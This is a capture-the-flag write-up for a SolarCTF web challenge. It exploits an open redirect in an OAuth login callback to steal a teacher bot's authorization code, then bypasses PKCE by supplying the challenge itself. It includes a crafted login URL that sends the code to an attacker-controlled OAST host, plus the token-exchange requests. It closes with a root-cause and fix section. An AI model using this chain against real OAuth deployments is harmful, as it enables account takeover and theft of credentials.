# Stecademia

**Event:** SolarCTF
**Category:** web
**Flag:** `SOLARCTF{...}`

---

| | |
|---|---|
| **Category** | Web |
| **Vuln** | Open redirect in OAuth `state` handling → authorization code theft → PKCE bypass (attacker-controlled challenge/verifier) → privilege escalation to `teacher` |

## 1. Recon

The site is an online programming school. Authentication uses PKCE:

```js
var verifier = b64u(crypto.getRandomValues(new Uint8Array(48)));
var digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier));
...
location.href = "/sso/auth?" + new URLSearchParams({
  client_id: "lms-web",
  response_type: "code",
  scope: "openid profile",
  redirect_uri: location.origin + "/login",
  state: state,
  code_challenge: b64u(digest),
  code_challenge_method: "S256"
});
```

After login, `/sso/auth` redirects back to `/login?code=...&state=...`, and the frontend exchanges the code for a token:

```js
function exchange(code, verifier) {
  return fetch("/sso/token", {
    method: "POST",
    body: JSON.stringify({
      grant_type: "authorization_code",
      code: code,
      code_verifier: verifier,
      client_id: "lms-web",
      redirect_uri: location.origin + "/login"
    })
  });
}
```

The flag lives behind a teacher-only endpoint:

```js
if (user.role === "teacher") {
  // "Open exam answer keys" button
  API.get("/api/exam-answers"); // -> { course, note, flag }
}
```

So the goal is to obtain a valid access token for a `teacher` account.

## 2. Finding the Open Redirect

`handleCallback()` in `/login` contains a leftover local-development path:

```js
function handleCallback() {
  var p = new URLSearchParams(location.search);
  var code = p.get("code");
  var st = p.get("state");

  if (st && st.indexOf("local") === 0) {
    window.location.replace("http://localhost:" + st.split("-")[1] + "/login" + location.search);
    return;
  }
  ...
}
```

If `state` starts with the literal string `local`, the page immediately redirects to `http://localhost:<st.split("-")[1]>/login`, carrying the **entire query string - including the authorization `code`** - along with it. The code assumes the part after the first `-` is a port number (e.g. `local-3000`), but nothing validates that assumption.

### The userinfo trick

A URL of the form `scheme://user:password@host/path` sends the browser to `host`, treating everything before `@` as credentials. So:

```
state = local-80@ATTACKER_HOST
```

produces:

```
http://localhost:80@ATTACKER_HOST/login?code=...&state=...
```

which the browser resolves to `ATTACKER_HOST`, not `localhost`. The attacker-controlled host receives the victim's authorization code.

### A constraint from the parsing

`st.split("-")[1]` means the attacker-controlled hostname must not itself contain a `-`, or the split would grab only part of it. Public OAST/webhook domains with UUID-style subdomains (e.g. webhook.site) are unusable here; a plain alphanumeric domain like one from `app.interactsh.com` (`xxxxxxxx.oast.fun`) or Burp Collaborator (`xxxxxxxx.oastify.com`) works.

## 3. Why PKCE Doesn't Save It

PKCE is designed so that a stolen authorization code is useless without the original `code_verifier`, which only the party that initiated the flow holds. That assumption breaks down here because **the attacker is the one constructing the login link** sent to the victim. The attacker:

1. Generates their own `verifier` / `code_challenge` pair.
2. Embeds their `code_challenge` in the crafted `/sso/auth` URL.
3. Sends that URL to the victim (the teacher).
4. The victim authenticates; the SSO server issues a code bound to the *attacker's* challenge.
5. The open redirect leaks that code to the attacker.
6. The attacker redeems the code with their own `verifier` - which matches, because they generated the challenge in the first place.

PKCE protects against a passive code interceptor who *doesn't* control the challenge. It does nothing against an attacker who supplies the challenge themselves.

## 4. Getting the Victim to Click

The support page lets students message a teacher; replies in testing showed the message is read by an automated agent ("teacher bot") that opens links sent to it. Submitting the crafted login URL as a support question causes the bot to visit `/sso/auth?...`, authenticate as the teacher, and get redirected through the open-redirect path with its authorization code - and in this instance the bot's reply itself echoed the broken URL it tried to open, handing the code back directly.

## 5. Exploitation

**Generate a PKCE pair** (challenge must not start with `-` or `_` to stay URL-safe without extra encoding):

```python
import secrets, hashlib, base64
verifier = secrets.token_urlsafe(48)
challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=").decode()
```

**Get a dash-free OAST domain** from `https://app.interactsh.com` (or Burp Community's built-in Collaborator client).

**Build the malicious login link:**

```
https://online-school.solarctf.ru/sso/auth?client_id=lms-web&response_type=code&scope=openid+profile&redirect_uri=https%3A%2F%2Fonline-school.solarctf.ru%2Flogin&state=local-80%40<OAST_DOMAIN>&code_challenge=<CHALLENGE>&code_challenge_method=S256
```

**Send it via `/support`** as a question to the teacher.

**Capture the authorization code** from the OAST interaction log (or, as happened here, directly from the bot's auto-reply quoting the broken URL).

**Exchange the code for a token:**

```http
POST /sso/token HTTP/1.1
Host: online-school.solarctf.ru
Content-Type: application/json

{"grant_type":"authorization_code","code":"<CODE>","code_verifier":"<VERIFIER>","client_id":"lms-web","redirect_uri":"https://online-school.solarctf.ru/login"}
```

Response includes a JWT whose payload decodes to `"role":"teacher"`.

**Call the protected endpoint:**

```http
GET /api/exam-answers HTTP/1.1
Host: online-school.solarctf.ru
Authorization: Bearer <ACCESS_TOKEN>
```

```json
{"course": "...", "note": "...", "flag": "SOLARCTF{...}"}
```

## Flag

```
SOLARCTF{...}
```
*(insert exact flag string from the response)*

## Debugging Notes

Hand-typed requests in a fresh Burp Repeater tab initially timed out / got `403`'d by the target. Two issues:

1. A manually typed raw request needs an explicit blank line after the last header, or Burp can hang waiting for more header data.
2. The target rejected bare, minimal requests (missing realistic `User-Agent`/`Accept`/etc., likely filtered by a WAF or bot-detection rule). The fix was to capture a **real browser-issued request** via Burp's Proxy history, send it to Repeater, and edit *that* request in place (swap the path to `/api/exam-answers`, add the `Authorization` header) rather than building one from scratch. Editing a request the server already accepted preserves every header/fingerprint detail it expects.

## Root Cause & Fix

1. **Open redirect in the OAuth callback handler:** the `state`-based "local dev" shortcut performs an unvalidated redirect that forwards the authorization code to an arbitrary attacker-controlled host. Dev/debug code paths should never ship to production, and redirect targets must be allow-listed, never derived from unauthenticated client-controlled input.
2. **PKCE misunderstanding:** PKCE defends against code interception by parties who didn't initiate the flow - it is not a substitute for `redirect_uri` validation. The authorization server must strictly validate `redirect_uri` against a registered allow-list per `client_id`.
3. **No bot/user caution around untrusted links:** an automated agent that visits arbitrary links submitted by any user is a built-in SSRF/credential-theft primitive. Automated agents with privileged sessions should never follow user-submitted URLs.

## Takeaways

- An "unguessable" security property (PKCE, random tokens) only holds if the attacker is excluded from generating/controlling the matching secret. Ask: *who creates this value, and could that be me?*
- Grep client-side JS for `state.indexOf`, `split("-")`, `localhost`, and other leftover dev/debug branches - these frequently ship to production unreviewed.
- When a server rejects or hangs on a hand-built request, capture a real one from the Proxy and edit it in place instead of debugging syntax from scratch.
